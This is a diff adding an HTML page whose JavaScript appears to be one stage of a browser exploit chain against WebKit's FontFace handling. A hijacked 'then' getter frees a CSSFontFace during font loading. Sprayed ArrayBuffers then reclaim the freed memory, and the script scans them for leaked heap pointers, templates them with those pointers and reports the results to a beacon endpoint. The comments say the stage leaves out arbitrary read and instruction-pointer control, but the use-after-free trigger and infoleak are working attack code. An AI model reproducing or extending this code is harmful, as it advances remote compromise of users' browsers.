@@ -1,0 +1,95 @@
+<!--
+  V681 — isolated FontFace reclaim diagnostic (p563/V675 trigger, no walk/forge)
+  Purpose: determine whether the current boot can reclaim CSSFontFace, independently
+  of V680's pre-filled 192-byte templates and delayed single scan.
+  Prior art: p563-fontface-reclaim-leak, p564 templating, V675 phase F.
+  CRASH_CLASS: HIGH — dangling FontFace continuation may kill WebProcess.
+  One attempt per fresh WebProcess. No forge, arbitrary read, or RIP trigger.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V681</title></head><body>
+<div id="verdict" style="position:sticky;top:0;font:700 18px monospace;padding:.6rem;background:#fff4d6">RUNNING</div>
+<pre id="out">V681 isolated reclaim</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8,styleEl=null,fired=false,resolved=false,rejected=false,map=[],checks=0;
+var scans=0,done=false,template=false,leak=false,hitCount=0,t58=0n,w68=0n;
+function post(m){
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V681-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send('');}catch(e){}
+}
+function b(m){try{O.textContent+='\n'+m;}catch(e){}post(m);}
+function verdict(m){document.getElementById('verdict').textContent=m;post('VERDICT-'+m);}
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hx(x){return '0x'+x.toString(16);}
+function hexB(x){return ('0'+x.toString(16)).slice(-2);}
+function put64(v,o,x){for(var k=0;k<8;k++)v[o+k]=Number((x>>BigInt(8*k))&255n);}
+function setup(){
+  b('VER-1');b('BOOT-'+UID);
+  var A;
+  try{A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(A);void A.loaded;window.__alive=[A];}catch(e){b('SETUP-ERR');return;}
+  styleEl=document.createElement('style');
+  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(styleEl);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    /* Explicitly drop the sheet's contents and JS reference as well as its node. */
+    try{if(styleEl){styleEl.remove();styleEl.textContent='';}}catch(e){}
+    try{document.fonts.delete(this);}catch(e){}
+    styleEl=null;
+    try{document.body.offsetHeight;}catch(e){}
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<K;k++)map.push({size:SIZES[si],view:new Uint8Array(new ArrayBuffer(SIZES[si]))});
+    }
+    /* p563/V675 consumption, deliberately omitted from V680's trigger. */
+    try{document.fonts.check('1em s0');checks++;}catch(e){}
+    return undefined;
+  },set:function(){}});
+  b('LOAD-CALLED');
+  document.fonts.load('1em f0, s0','AB').then(function(){resolved=true;b('RESOLVED');},function(e){rejected=true;b('REJECTED-'+String(e&&e.name||e));});
+  setTimeout(scan,60);
+  setTimeout(scan,140);
+  setTimeout(scan,400);
+  setTimeout(function(){if(!done){b('NOSCAN-fired-'+(fired?1:0)+'-resolved-'+(resolved?1:0)+'-rejected-'+(rejected?1:0));verdict('NO RESULT');done=true;}},1800);
+}
+function scan(){
+  if(done)return;
+  scans++;
+  if(!map.length){b('NOMAP-fired-'+(fired?1:0)+'-resolved-'+(resolved?1:0)+'-rejected-'+(rejected?1:0));return;}
+  var out=[],nonzero=0;
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,n=0,first=-1;
+    for(var j=0;j<v.length;j++)if(v[j]!==0){n++;if(first<0)first=j;}
+    if(n){
+      nonzero++;
+      var s='',stop=Math.min(v.length,first+192);
+      for(var j2=first;j2<stop;j2++)s+=hexB(v[j2]);
+      out.push('b'+i+'-s'+map[i].size+'-o'+first+'-n'+n+'-'+s);
+      if(map[i].size===192){
+        var a=le(v,0x58),w=le(v,0x68);
+        if(a>0x1000000000n&&w>0x1000000000n){
+          t58=a;w68=w;leak=true;hitCount++;
+          if(!template){
+            for(var q=0;q<map.length;q++)if(map[q].size===192){
+              map[q].view[0]=1;map[q].view[1]=0;map[q].view[2]=0;map[q].view[3]=0;
+              put64(map[q].view,0x58,t58);put64(map[q].view,0x68,w68);
+            }
+            template=true;b('TEMPLATE');
+          }
+        }
+      }
+    }
+  }
+  b('SCAN-'+scans+'-nonzero-'+nonzero+'-fired-'+(fired?1:0)+'-resolved-'+(resolved?1:0)+'-rejected-'+(rejected?1:0)+'-checks-'+checks);
+  if(out.length)b('HIT-'+out.join('_').slice(0,700));
+  if(leak){b('LEAK-T58-'+hx(t58)+'-W68-'+hx(w68)+'-hits-'+hitCount);done=true;verdict('LEAK OK');return;}
+  if(scans>=3){done=true;b('ALL-CLEAN-'+map.length);verdict('NOLEAK');}
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(setup,0);
+else document.addEventListener('DOMContentLoaded',setup);
+</script></body></html>
